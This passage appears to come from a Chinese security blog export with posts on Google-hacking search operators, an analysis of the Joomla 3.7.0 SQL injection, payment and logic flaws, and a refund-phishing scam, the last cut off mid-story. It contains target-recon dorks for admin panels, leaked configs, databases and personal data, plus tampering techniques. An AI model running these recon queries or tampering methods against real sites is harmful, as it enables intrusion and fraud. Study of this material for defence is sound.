这个我要重点推荐一下,无论是撒网式攻击还是我们后面要说的对特定目标进行信息收集都需要用到这个.搜索指定 类型的文件.例如输入</span><br><span class="line"></span><br><span class="line">filetype:.doc 将返回所有以doc结尾的文件URL.当然如果你找.bak、.mdb或.inc也是可以的,获得的信息也许会更丰富</span><br><span class="line"></span><br><span class="line">info: 查找指定站点的一些基本信息.</span><br><span class="line"></span><br><span class="line">inurl:搜索我们指定的字符是否存在于URL中.</span><br><span class="line">例如输入:</span><br><span class="line">inurl:admin,将返回N个类似于这样的连接 </span><br><span class="line"></span><br><span class="line">http://www.xxx.com/xxx/admin,用来找管理员登录地址 </span><br><span class="line">例如搜索:</span><br><span class="line">inurl:baidu.com  可以返回url中含baidu.com的网页 </span><br><span class="line"></span><br><span class="line">site:这个也很有用,</span><br><span class="line">例如:site:www.baidu.com</span><br><span class="line">将返回所有和baidu.com这个站有关的URL.(搜索子域名)</span><br></pre></td></tr></table></figure>

<p><strong>常用搭配</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找后台地址：</span><br><span class="line">site:域 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line"></span><br><span class="line">查找文本内容：</span><br><span class="line">site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</span><br><span class="line"></span><br><span class="line">查找可注入点：</span><br><span class="line">site:域名 inurl:aspx|jsp|php|asp</span><br><span class="line"></span><br><span class="line">查找上传漏洞：</span><br><span class="line">site:域名 inurl:file|load|editor|Files</span><br><span class="line"></span><br><span class="line">找eweb编辑器：</span><br><span class="line">site:域名 </span><br><span class="line">inurl:ewebeditor|editor|uploadfile|eweb|edit</span><br><span class="line"></span><br><span class="line">存在的数据库：</span><br><span class="line">site:域名 filetype:mdb|asp|#</span><br><span class="line"></span><br><span class="line">查看脚本类型：</span><br><span class="line">site:域名 filetype:asp/aspx/php/jsp</span><br><span class="line"></span><br><span class="line">迂回策略入侵：</span><br><span class="line">inurl:cms/data/templates/images/index/</span><br></pre></td></tr></table></figure>



<h1 id="0501"><a href="#0501" class="headerlink" title="0501"></a>0501</h1><p>[intitle：] </p>
<p>标题搜索帮助google限定了你搜索的结果，只有那些标题含有你指定的关键词的页面会返回给你。例如“intitle：login password”会返回标题含有登录，而页面里面随便什么地方含有密码的网页给你。<br>当你想在标题里面搜索超过2个词的时候，你可以使用“allintitle：”，当然也可以使用“intitle”来代替搜索，“intitle：login intitle：password”和“allintitle：登录密码”的搜索结果是一样的。</p>
<p>[inurl：] </p>
<p>按链接搜索返回那些网址url里面包含你指定关键词的页面。例如“inurl：passwd”，返回那些网址url里面包含你指定关键词passwd的页面。同上，如果你想在网址里搜索多个关键词，你可以使用“allinurl：”语法。例如“allinurl：etc / passwd”会搜索网址里含有等和和passwd的网页，斜杠“/ “会被谷歌忽略。</p>
<p>[site：] </p>
<p>语法”网站：“只搜索指定网域里的关键词，例如” oits site：hackingspirits.com“将搜索hackingspirits.com网站上的所有包含exploitits的页面。</p>
<p>[filetype：]</p>
<p>按指定文件类型即后缀搜索（例如doc，pdf或ppt等等）。例如“filetype：doc site：gov confidential”将搜索所有.gov的政府网站上的.doc文件和含有机密关键字的页面，或者是.doc文件里面含有关键字的机密的页面，这意味着搜索结果将返回政府网站上所有机密的.doc文件。</p>
<p>[link：] </p>
<p>按引用搜索将列出所有包含特定链接的页面，例如“链接：<a href="http://www.securityfocus.com/">www.securityfocus.com</a> “将列出所有包含指向Securityfocus主页的网址的页面。</p>
<p>[相关：] </p>
<p>按相似搜索将列出与指定网页相似的页面，例如”相关：<a href="http://www.securityfocus.com/">www.securityfocus.com</a> “将返回与Securityfocus筑页相似的页面注意在“相关：”与网址间不可以有空格。</p>
<p>[缓存：] </p>
<p>网页快照，谷歌将返回给你他储存下来的历史页面如果你同时指定了其他查询词，谷歌将在搜索结果里以高亮显示例如查询。“缓存：<a href="http://www.hackingspirits.com/">www.hackingspirits.com</a>客”在返回的结果里将高 显示”客人”（受GFW影响，在大陆应该是用不了的）。</p>
<p>[INTEXT：] </p>
<p>‘INTEXT：’寻找特定网页里的关键字，他不理会网址和文章标标题例如‘INTEXT：漏洞’将只返回包含指定关键字“exploits”的网页的地址。</p>
<p>[电话簿：]</p>
<p>电话簿查询美国街道地址和电话号码信息。例如“phonebook <a href="https://www.bugku.com/static/image/smiley/default/sweat.gif"><img src="https://www.bugku.com/static/image/smiley/default/sweat.gif" alt="img"></a>isa + CA”将查询名字里面包含“Lisa”并住在加州的人的所有名字。这对黑客使用社会工程学去挖掘个人信息是很有用的</p>
<p>[索引] </p>
<p>利用“索引”语法去发现允许目录浏览的网站，就象在本地的普通目录一样。下面是一些有趣的查询：<br>/ admin的<br>索引/ passwd<br>索引/密码<br>索引of / mail<br>“Index of /”+ passwd<br>“Index of /”+ password.txt<br>“index of /”+ .htaccess<br>“index of / root”<br>“index of / cgi-bin”<br>“index of / logs”<br>“索引/ config“<br>（包含引号）</p>
<h1 id="0516"><a href="#0516" class="headerlink" title="0516"></a>0516</h1><p><strong>一</strong></p>
<p><strong>GoogleHacking常用语法</strong></p>
<p>1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件</p>
<p>2、intitle：把网页标题中的某个字符作为搜索的条件</p>
<p>3、cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信</p>
<p>息</p>
<p>4、filetype/ext：指定一个格式类型的文件作为搜索对象</p>
<p>5、inurl：搜索包含指定字符的URL</p>
<p>6、site：在指定的(域名)站点搜索相关内容</p>
<p><strong>GoogleHacking其他语法</strong></p>
<p>1、引号 ‘’ “ 把关键字打上引号后，把引号部分作为整体来搜索<br>2、or 同时搜索两个或更多的关键字<br>3、link 搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL<br>4、info 查找指定站点的一些基本信息<br>GoogleHackingDatabase<br><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
<p><strong>二</strong></p>
<p><strong>典型姿势：</strong></p>
<h2 id="1-管理后台地址"><a href="#1-管理后台地址" class="headerlink" title="1.管理后台地址"></a><strong>1.管理后台地址</strong></h2><p>site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system<br>site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend<br>site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="2-上传漏洞地址"><a href="#2-上传漏洞地址" class="headerlink" title="2.上传漏洞地址"></a><strong>2.上传漏洞地址</strong></h2><p>site:target.com inurl:file<br>site:target.com inurl:upload</p>
<p>file|load|editor|Files</p>
<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="3-注入页面"><a href="#3-注入页面" class="headerlink" title="3.注入页面"></a><strong>3.注入页面</strong></h2><p>site:target.com inurl:php?id=</p>
<h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><h2 id="4-编辑器页面"><a href="#4-编辑器页面" class="headerlink" title="4.编辑器页面"></a><strong>4.编辑器页面</strong></h2><p>site:target.com inurl:ewebeditor</p>
<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><h2 id="5-目录遍历漏洞"><a href="#5-目录遍历漏洞" class="headerlink" title="5.目录遍历漏洞"></a><strong>5.目录遍历漏洞</strong></h2><p>site:target.com intitle:index.of</p>
<h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><h2 id="6-SQL错误"><a href="#6-SQL错误" class="headerlink" title="6.SQL错误"></a><strong>6.SQL错误</strong></h2><p>site:target.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”<br>phpinfo()<br>site:target.com ext:php intitle:phpinfo “published by the PHP Group”</p>
<h2 id="-5"><a href="#-5" class="headerlink" title></a></h2><h2 id="7-配置文件泄露"><a href="#7-配置文件泄露" class="headerlink" title="7.配置文件泄露"></a><strong>7.配置文件泄露</strong></h2><p>site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</p>
<h2 id="-6"><a href="#-6" class="headerlink" title></a></h2><h2 id="8-数据库文件泄露"><a href="#8-数据库文件泄露" class="headerlink" title="8.数据库文件泄露"></a><strong>8.数据库文件泄露</strong></h2><p>site:target.com ext:.sql | .dbf | .mdb | .db</p>
<h2 id="-7"><a href="#-7" class="headerlink" title></a></h2><h2 id="9-日志文件泄露"><a href="#9-日志文件泄露" class="headerlink" title="9.日志文件泄露"></a><strong>9.日志文件泄露</strong></h2><p>site:target.com ext:.log</p>
<h2 id="-8"><a href="#-8" class="headerlink" title></a></h2><h2 id="10-备份和历史文件泄露"><a href="#10-备份和历史文件泄露" class="headerlink" title="10.备份和历史文件泄露"></a><strong>10.备份和历史文件泄露</strong></h2><p>site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</p>
<h2 id="-9"><a href="#-9" class="headerlink" title></a></h2><h2 id="11-公开文件泄露"><a href="#11-公开文件泄露" class="headerlink" title="11.公开文件泄露"></a><strong>11.公开文件泄露</strong></h2><p>site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</p>
<h2 id="-10"><a href="#-10" class="headerlink" title></a></h2><h2 id="12-邮箱信息"><a href="#12-邮箱信息" class="headerlink" title="12.邮箱信息"></a><strong>12.邮箱信息</strong></h2><p>site:target.com intext:@target.com<br>site:target.com 邮件<br>site:target.com email</p>
<h2 id="-11"><a href="#-11" class="headerlink" title></a></h2><h2 id="13-社工信息"><a href="#13-社工信息" class="headerlink" title="13.社工信息"></a><strong>13.社工信息</strong></h2><p>site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>googlehack</category>
      </categories>
      <tags>
        <tag>SRC</tag>
        <tag>基础语法</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-8917个人理解</title>
    <url>/2020/05/01/CVE-2017-8917%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>这两天正好在网上看到看到了关于2017一个Joomla的漏洞，所以就尝试跟着做了一下，感觉还是有些云里雾里的，特此梳理。小白一个，请大佬们多多指教，欢迎交流</p>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>前提，下载Joomla！3.7.0版本（我已经上传到了自己博客里面，可免费下载），应该随便一个版本都可以，这里是直接安装的企业什么什么版（我不记得了），然后，跟着安装就是了</p>
<p>本文，是直接将cms安装到www的路径下的，www就是根目录</p>
<h1 id="0x02-正题"><a href="#0x02-正题" class="headerlink" title="0x02 正题"></a>0x02 正题</h1><p>3.7.0新增一个 <code>com_field</code> 组件,这个组件很神奇，不需要授权就可以访问</p>
<h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>首先看到<code>\components\com_fields\controller.php</code>（怎么找到这个东西的，我就不说了，因为我也不知道，可能这就是我和大佬的差距吧）</p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/1.png">

<p>查了一下<code>JFactory </code>是一个静态类,用来获取各种系统对象的引用</p>
<p>代码不难，最关键的是它先判断view和layout的值（这就表示普通用户可以通过这样的请求来使用管理员的 <code>com_fields</code>），成立就执行下边的语句：</p>
<p>加载<code>JPATH_ADMINISTRATOR</code>中的<code>com_fields</code>组件</p>
<p>将<code>base_path</code>设置为 <code>JPATH_COMPONENT_ADMINISTRATOR</code></p>
<h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>那既然和这个组件有关，就去看看<code>com_fields</code> ，来到<code>administrator/components/com_fields/models/fields.php</code>，前面的看了一下代码，确实感觉没什么好刺眼的东西，所以就直接来到了<code>getListQuery</code>函数，大概305行的位置</p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/2.png">

<p>程序通过 <code>$this-&gt;getState</code> 取到 <code>list.fullordering</code> ，然后使用 <code>$db-&gt;escape</code> 处理后传入 <code>$query-&gt;order</code> 函数，跟进escape函数,位于<code>\libraries\fof\database\driver\mysqli.php</code>（也可以是mysql.php,都是一样的）</p>
<p><img src="https://ckcah.github.io/images/CVE-2017-8917/3.png">3.png)</p>
<p>这个函数熟悉吧，学代码审计的时候，sql注入有讲解这个函数，调用 <code>mysqli_real_escape_string</code> 来转义字符，但是仅对单双引号等字符进行转义，就没有其他过滤了</p>
<p>在<code>\administrator\components\com_fields\models\fields.php</code>里面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query-&gt;order($db-&gt;escape($listOrdering) . &#x27; &#x27; . $db-&gt;escape($orderDirn)); </span><br><span class="line"></span><br><span class="line">$query-&gt;order 函数的作用仅仅是将数据拼接到sql语句后，未进行过滤，所以如果 list.fullordering 可控，那就可以进行注入</span><br></pre></td></tr></table></figure>



<h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>到这里，其实就已经找到了注入点，但是安全起见，看看在之前的其他函数（其实没必要，因为sql注入这东西，可能是因为本人还资质尚浅，所以我见过的代码中，基本上都是在于数据库交互那一步做防护，其他地方我没有遇到过）</p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/4.png">

<p><code>list.fullordering</code> 是一个 <code>state</code></p>
<p>追踪一下这个东西，找了很久，实在不知道到底是怎么state返回找到display，所以参考了另一篇文章，他的方法是根据最开始的<code>\components\com_fields\controller.php</code>，最后的代码有一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parent::__construct($config);</span><br></pre></td></tr></table></figure>

<p>parent这里，就是父类</p>
<p>查找函数__construct，然后就追溯到<code>\libraries\legacy\controller\legacy.php</code>,</p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/5.png">

<p>通过<code>$this-&gt;$doTask</code>调用<code>display()</code>函数（这里我也不明白）</p>
<p><code>display()</code>函数就在这个文件中（613行），可以看到它调用了视图（$view）</p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/6.png">

<p>然后跟进display函数来到<code>\administrator\components\com_fields\views\fields\view.html.php</code></p>
<p>解答了我刚刚找不到state的疑惑</p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/7.png">

<p>继续往下看，据说是会调用 <code>getState()</code>，但是我没找到，直接看<code>\libraries\legacy\model\legacy.php</code>的这个函数</p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/8.png">

<p>，然后，跟进populateState函数来到<code>\libraries\legacy\model\list.php</code>，大概495行的样子，有一个判断语句</p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/9.png">

<p>不知道getUserStateFromRequest函数，再跟进，来到<code>\libraries\cms\application\cms.php</code></p>
<img src="https://ckcah.github.io/images/CVE-2017-8917/10.png">

<p>大概就是如果数组的key不在黑名单（blacklisted）中，将会为<code>$list</code>变量根据相应的<code>State</code>进行注册，在这部分函数运行到结束部分，可以看见成功的控制了<code>list</code>数组的<code>fullordering</code>的值</p>
<p>到这里，就没继续的必要了，因为你已经把<code>\administrator\components\com_fields\models\fields.php</code>escape之前的东西追溯了这么多了，还没发现问题，就没必要再继续了。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑漏洞</title>
    <url>/2020/05/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="主要的常见类型"><a href="#主要的常见类型" class="headerlink" title="主要的常见类型"></a>主要的常见类型</h1><h2 id="登录缺陷和账户认证缺陷"><a href="#登录缺陷和账户认证缺陷" class="headerlink" title="登录缺陷和账户认证缺陷"></a>登录缺陷和账户认证缺陷</h2><p>验证码回传</p>
<p>未进行登录凭证验证</p>
<p>验证码爆破</p>
<p>未授权访问</p>
<p>。。。</p>
<h2 id="会话管理缺陷"><a href="#会话管理缺陷" class="headerlink" title="会话管理缺陷"></a>会话管理缺陷</h2><img src="https://ckcah.github.io/images/1.png">

<p>固定会话攻击</p>
<p>修改cookie中的某个参数可以登录其他用户（cookie仿冒）</p>
<h2 id="权限管理缺陷"><a href="#权限管理缺陷" class="headerlink" title="权限管理缺陷"></a>权限管理缺陷</h2><p>未授权权限访问</p>
<p>越权：1.水平越权、2.垂直越权</p>
<p>水平越权：相同权限的用户可以互相访问</p>
<p>垂直越权：低用户可以访问到高用户</p>
<h2 id="API滥用"><a href="#API滥用" class="headerlink" title="API滥用"></a>API滥用</h2><p>验证码爆破</p>
<p>短信轰炸</p>
<p>无限充值</p>
<p>用户添加等。。。</p>
<p>1.业务接口调用：</p>
<p>​    重放攻击</p>
<p>​    恶意注册</p>
<p>​    短信炸弹</p>
<h1 id="支付逻辑类"><a href="#支付逻辑类" class="headerlink" title="支付逻辑类"></a>支付逻辑类</h1><h2 id="支付过程中可直接修改数据包中的支付金额"><a href="#支付过程中可直接修改数据包中的支付金额" class="headerlink" title="支付过程中可直接修改数据包中的支付金额"></a>支付过程中可直接修改数据包中的支付金额</h2><p>这种漏洞应该是支付漏洞中最常见的，主要针对支付宝等需要第三方支付的案例。开发人员往往会为了方便，直接在支付的关键步骤数据包中直接传递需要支付的金额。而这种金额后端没有做校验，传递过程中也没有做签名，导致可以随意篡改金额提交。</p>
<p>只需要在支付过程中用抓包工具抓包发现有金额的参数修改成任意即可。</p>
<h2 id="没有对购买数量进行限制"><a href="#没有对购买数量进行限制" class="headerlink" title="没有对购买数量进行限制"></a><strong>没有对购买数量进行限制</strong></h2><p>这种案例也比较常见，产生的原因是开发人员没有对购买商品的数量参数进行严格的限制。这种同样是数量的参数没有做签名，在抓包后导致可随意修改数量，经典的修改方式就是改成负数。</p>
<p>当购买的数量是一个负数时，总额的算法仍然是”购买数量x单价=总价”。所以这样就会导致有一个负数的需支付金额。若支付成功，则可能导致购买到了一个负数数量的产品，也有可能购物网站会返还相应的积分/金币到你的账户上。</p>
<p>但是，这种情况不可能发生在通过支付宝支付的订单中，因为显然支付宝是不支持一个负数金额的订单，所以这种情况多数发生在一个有站内虚拟货币的网站。</p>
<h2 id="购买商品编号篡改"><a href="#购买商品编号篡改" class="headerlink" title="购买商品编号篡改"></a><strong>购买商品编号篡改</strong></h2><p>例如商品积分兑换处，100个积分只能换商品编号为001的低价格商品，1000个积分能换商品编号005的高价格商品，在用100积分换商品的时候抓包把换商品的编号从001修改为005，用低积分换区高积分商品。</p>
<h2 id="支付逻辑顺序执行缺陷"><a href="#支付逻辑顺序执行缺陷" class="headerlink" title="支付逻辑顺序执行缺陷"></a><strong>支付逻辑顺序执行缺陷</strong></h2><p>部分网站的支付逻辑可能是先A过程后B过程然后C过程最后D过程用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。但是，如果用户直接从B直接进入了D过程，就绕过了C过程。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。</p>
<h2 id="请求重放"><a href="#请求重放" class="headerlink" title="请求重放"></a><strong>请求重放</strong></h2><p>购买商品成功后，重放购买成功的http请求，可以使购买的商品一直增加。购买成功后，会有一个从银行向商户网站跳转的过程，如果这个过程反复的重放，有可能导致商品的反复购买和增加，但是用户不需要支付更多的金钱。</p>
<h2 id="程序的异常处理"><a href="#程序的异常处理" class="headerlink" title="程序的异常处理"></a><strong>程序的异常处理</strong></h2><p>程序的异常处理比较少见，不过也是有案例的。程序的异常处理，就是指支付的数据包异常的程序的错误处理。这种异常可以是数据与KEY不符，支付的金额有错误，购买的数量不正确等等。程序的异常处理出现的原因主要是开发人员对出现异常后的处理不当造成的。</p>
<p>当然支付逻辑漏洞不止上面列举的这些类型，但最常见的支付漏洞为直接修改金额，修改购买商品数量以及窜改商品编号这三种，下面就来实践下这三种支付逻辑漏洞。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>逻辑漏洞</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>近期高发支付宝、京东理赔，快递类诈骗，花3个小时控制诈骗犯的电脑</title>
    <url>/2020/05/01/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D%E3%80%81%E4%BA%AC%E4%B8%9C%E7%90%86%E8%B5%94%EF%BC%8C%E5%BF%AB%E9%80%92%E7%B1%BB%E8%AF%88%E9%AA%97%EF%BC%8C%E8%8A%B13%E4%B8%AA%E5%B0%8F%E6%97%B6%E6%8E%A7%E5%88%B6%E8%AF%88%E9%AA%97%E7%8A%AF%E7%9A%84%E7%94%B5%E8%84%91/</url>
    <content><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>争得作者本人同意，附带链接进行转发</p>
<p>原文地址：<a href="https://mp.weixin.qq.com/s/y73XOIHZAWYIylaGXxmkdg">https://mp.weixin.qq.com/s/y73XOIHZAWYIylaGXxmkdg</a></p>
<p>（现在直接在微信搜，都还有类似的，大家可以实践一下）</p>
<p><strong>本文由浅黑科技和HACK学习联合发布</strong></p>
<p>近期公众号出现了很多关于理赔类的诈骗，面向目标基本上宝妈</p>
<p><strong>1</strong></p>
<p>“喂，您好，请问是张XX女士吗？”</p>
<p>虽然平日里我也自称“防骗小能手”，但是当电话那头一个温柔而专业的女声念出我的名字时，我完全没意识到，电话线另一头是诈骗团伙，完全没往那个方向想。</p>
<p>我说，是。</p>
<p>对方说，您好，我是淘宝店铺强生的客服，您之前在我们这购买的卫生棉条您现在还在用吗？</p>
<p>我有些感到隐私被冒犯，就说：“你有什么事就直说。”当时也不知道为啥没直接挂断，兴许是我太有礼貌了，想着如果是求好评我再挂断，说不定有别的事呢。</p>
<p>“是这样的，这个产品很多顾客反馈说用了之后有瘙痒症状，我们拿去质检部门检测，也发现产品质量有问题，现在工商部门强制要求我们全部召回，您那边也别再继续使用我们这款产品了。”对方说。</p>
<p>卧槽，我心想，我特么正在用着，可是我好像也没感到什么不适，难道我是免疫体质……？（男生如果不懂卫生棉条是什么东西，可以想象你在网上买了一盒避孕套，用了之后店主打电话说这一批货上面都被扎了针孔）</p>
<p>正想着，对方说，近期会有快递小哥联系上门取件，请您留意一下，“您的地址是……对吗？”我说，是的。</p>
<p>确认地址之后，对方继续说：“我现在把钱赔付给您，可能会耽误您几分钟时间……”</p>
<p>疫情期间宅在家，本来也不忙，心想那就退钱吧。对方告诉我，<strong>理赔需要确认是我本人，得实名认证。</strong></p>
<p>按照对方说的流程，我“打开微信——搜索公众号——输入8641——找到理赔8641——进入公众号界面——点击理赔退款——填写信息”。</p>
<p>填写时，对方还很体贴地提醒我：“<strong>您默默填写就好，不要念出来，我们这边电话是有录音的，小心别泄露了您的个人信息</strong>，填写时如果有什么疑问可以随时问我。”</p>
<p>填完信息，最后一项是收验证码，验证手机号，我输入完验证码，跳转到下一级页面，忽然提示我验证码已过期。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/1.png">

<p>我告诉对方，对方问：“您是不是摁了两次获取验证码？”</p>
<p>我也记不清了，就说是。</p>
<p>第二条短信发过来，看到银行的提醒里的“骗子”两个字，我心里心里一震，终于警觉了！我特么终于警觉了！！！等等！怎么是我在给对方转账？</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/2.png">



<p>“您验证码收到了吗？”对方还在问。</p>
<p>“你是骗子吧？怎么是我在给你转钱？”我说。</p>
<p>对方还死不认账：“没有，是我在给你转钱……请问您短信收到了吗？”</p>
<p>挂掉电话后，我感觉找卖家核实索赔信息的真实性，转移银行卡里的钱、修改银行账户、淘宝、支付宝密码，因为之前在那个钓鱼页面里都填过。期间骗子不停地打过来电话，也不知是想继续行骗还是拖延时间，我赶紧将其拉黑。</p>
<p>之后，我通过微信举报，将“理赔8641”公众号投诉至关闭。在回顾整个过程，写下这些文字时，我仍是心有余悸。</p>
<p><strong>2</strong></p>
<p>上述是我在朋友圈看到的<strong>真实案例</strong>，我做了一些文字上的修改和叙述方式上的调整。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/3.png">



<p>所以以后如果你和你的家人如果接到类似电话，直接挂断，掏出手机找官方客服，好吧？</p>
<p>这个骗局主要有三个骚点：</p>
<p>一、骗子把目标受害者的资料摸得一清二楚，包括姓名、电话、邮寄地址、购物详情，有备而来。</p>
<p>二、用话术塑造安全感，比如叮嘱目标受害者“<strong>不要把填的资料念出来</strong>”，其实是为了引导目标受害者把注意力放在“念出来”这件事上，从而忽略填写资料这件事本身的安全性，<strong>给人营造一种虚假的安全感：只要我不念出来，就是安全的。</strong></p>
<p>就像是变魔术时引导观众注意力，或者有点类似于销售员问你想买这一款，还是那一款？不会问你想不想买。</p>
<p>三、提前准备好了“理赔8641”公众号和高仿真的钓鱼界面。</p>
<p>现在我们把注意力放在第三条。</p>
<p>我本来想搜索“理赔8641”，看看那个用来诈骗的公众号还在不在，却发现刚输入“理赔8”，下面就自动补全了一溜搜索内容，这说明以前有人这么搜过。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/4.png">



<p>也就是说，除了“理赔8641”公众号，一定还有很多同样功能的诈骗公众号，被封了一个直接换用另外一个。并且上面那张图中弹出的每一个自动补全的搜索内容，背后都有至少一个被宰的受害者。</p>
<p>顺着这个思路，我在微信里搜索公众号“理赔”，想看看究竟有多少个这样的公众号。</p>
<p>起初全是保险行业相关的公众号，就像这样：</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/5.png">



<p>于是我倒了一杯茶一边喝一边慢慢往下划，划了半个钟头（此处用了夸张的修辞手法），接下来就是见证奇鸡的时刻。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/6.png">



<p>数量非常多，一溜头像都是支付宝的图标。此处手动@支付宝。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/7.png">



<p>也有一些不一样的，图标是快递。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/8.png">



<p>又或者是“纸尿裤理赔中心”，听这些名字，你应该就能猜到骗子的剧本了吧？</p>
<p>这些账号大多是在2019年底至2020年4月份之间注册的，正好赶上大家宅在家里的这一段时间。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/9.png">



<p>我点进“理赔中心0059”，公众号立马给我自动回复了一张二维码图片：</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/10.png">



<p>扫进去，是一个登录界面，让登录支付宝账号。</p>
<p>界面有模有样，最底下还有网站备案号。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/11.png">



<p>其实是个钓鱼页面，输入的所有内容都会传到骗子那里。</p>
<p>怎么确认是钓鱼网站的呢？随手输个账号密码都能进去。（当然，也有钓鱼网站会拿着你的密码去真实的网站登录，可以做到必须输入正确的账号密码才能进）</p>
<p>进去之后会问你“退款银行”</p>
